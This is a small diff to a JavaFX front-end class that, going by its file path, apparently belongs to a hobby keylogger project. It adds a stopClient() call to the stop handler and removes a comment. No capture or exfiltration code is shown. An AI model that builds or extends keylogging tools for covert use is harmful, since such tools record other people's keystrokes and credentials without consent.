@@ -147,6 +147,7 @@ public class Front extends Application {
 
                 System.out.println("Stopping");
                 s.flag();
+                c.stopClient();
                 primaryStage.setScene(scene2);
 
                 File file = new File("C://Users//91932//Desktop//timepass//java//Keylogger//op.txt");
@@ -176,5 +177,4 @@ public class Front extends Application {
 }
 
 /*
-with exit button
  */
